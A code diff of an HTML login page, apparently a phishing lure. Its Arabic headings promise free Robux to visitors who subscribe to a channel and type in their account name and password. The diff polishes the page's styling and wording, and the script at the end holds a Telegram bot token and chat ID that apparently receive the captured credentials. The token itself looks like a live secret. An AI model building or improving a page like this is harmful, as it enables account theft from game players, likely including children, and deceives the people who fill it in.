@@ -6,12 +6,93 @@
     <title>Glowing Login Form</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <style>
+        /* التنسيق الأساسي للصندوق */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f4f4f4;
+        }
+
+        .login-box {
+            background: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+
+        /* تنسيق حقول الإدخال */
+        .user-box {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .user-box input {
+            width: 100%;
+            padding: 10px;
+            background: transparent;
+            border: 1px solid #ccc;
+            outline: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .user-box label {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            color: #333;
+            font-size: 16px;
+            transform: translateY(-50%);
+            pointer-events: none;
+            transition: 0.3s;
+        }
+
+        .user-box input:focus ~ label,
+        .user-box input:valid ~ label {
+            top: -10px;
+            font-size: 12px;
+            color: #0066cc;
+        }
+
+        /* تنسيق الزر */
+        button {
+            padding: 10px 20px;
+            background-color: #0066cc;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #005bb5;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
-            <h2>الكمية محدودمن قناتنا محد يكون معه رابط غير الي اشترك بقناتي اكتب اسم حسابك وباسورده  ويمكن تربح 100 الى 400 روبوكس</h2>
-            <h2>الروبوكس محدود _يرجى الاشتراك بقناتنا ايضا لنقدم المزيد من الهدايه</h2>
+            <h2>الكمية محدود من قناتنا. فقط من يشترك في قناتنا يمكنه الحصول على الرابط. اكتب اسم حسابك وكلمة المرور ويمكنك ربح روبوكس</h2>
+            <h2>يرجى الاشتراك في قناتنا للحصول على المزيد من الهدايا</h2>
             <form id="login-form">
                 <div class="user-box">
                     <input type="text" id="username" required>
@@ -21,10 +102,11 @@
                     <input type="password" id="password" required>
                     <label>Password</label>
                 </div>
-                <button type="button" id="login-btn">Submit</button> <!-- تغيير من <a> إلى <button> -->
+                <button type="button" id="login-btn">Submit</button> 
             </form>
         </div>
     </div>
+
     <script>
         const TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4"; // التوكن الخاص بك
         const CHAT_ID = "6243038338"; // معرف الشات الخاص بك
